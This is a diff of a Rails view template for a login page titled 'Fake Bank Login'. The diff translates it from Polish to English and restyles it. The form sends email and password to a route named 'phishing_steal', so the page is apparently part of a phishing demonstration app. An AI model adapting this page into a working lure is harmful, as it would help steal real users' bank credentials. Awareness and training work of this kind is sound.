@@ -1,29 +1,37 @@
-<div class="flex justify-center items-center h-screen bg-gray-100">
-  <div class="w-full max-w-md bg-white p-8 rounded-lg shadow-lg">
-    <h1 class="text-2xl font-bold mb-4 text-center text-red-500">Fałszywa strona banku!</h1>
+<div class="flex justify-center items-center min-h-screen">
+  <div class="w-full max-w-md bg-white p-8 rounded-2xl shadow-2xl">
+    <h1 class="text-3xl font-bold mb-6 text-center text-red-600">Fake Bank Login</h1>
 
     <% if flash[:alert].present? %>
-      <div class="bg-red-200 text-red-800 p-2 rounded mb-4 text-center"><%= flash[:alert] %></div>
+      <div class="bg-red-500 text-white p-3 rounded-md mb-4 text-center shadow-md">
+        <%= flash[:alert] %>
+      </div>
     <% end %>
 
     <% if flash[:notice].present? %>
-      <div class="bg-green-200 text-green-800 p-2 rounded mb-4 text-center"><%= flash[:notice] %></div>
+      <div class="bg-green-500 text-white p-3 rounded-md mb-4 text-center shadow-md">
+        <%= flash[:notice] %>
+      </div>
     <% end %>
 
-    <p class="text-sm text-gray-600 mb-4">Podaj swoje dane, aby zalogować się.</p>
+    <p class="text-center text-sm text-gray-600 mb-4">
+      Please enter your credentials to log in.
+    </p>
 
-    <%= form_with url: phishing_steal_path, method: :post, class: "space-y-4" do %>
+    <%= form_with url: phishing_steal_path, method: :post, class: "space-y-5" do %>
       <div>
-        <label class="block text-sm font-medium">E-mail</label>
-        <%= text_field_tag :email, nil, class: "w-full p-2 border rounded" %>
+        <label class="block text-sm font-semibold text-gray-700 mb-1">Email</label>
+        <%= text_field_tag :email, nil, class: "w-full p-3 border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-red-400 focus:border-red-400 transition" %>
       </div>
 
       <div>
-        <label class="block text-sm font-medium">Hasło</label>
-        <%= password_field_tag :password, nil, class: "w-full p-2 border rounded" %>
+        <label class="block text-sm font-semibold text-gray-700 mb-1">Password</label>
+        <%= password_field_tag :password, nil, class: "w-full p-3 border border-gray-300 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-red-400 focus:border-red-400 transition" %>
       </div>
 
-      <button class="w-full bg-red-500 text-white p-2 rounded hover:bg-red-600">Zaloguj</button>
+      <button class="w-full bg-red-500 text-white p-3 rounded-lg shadow-lg hover:bg-red-600 transition duration-300 ease-in-out transform hover:-translate-y-1">
+        Log in
+      </button>
     <% end %>
   </div>
 </div>
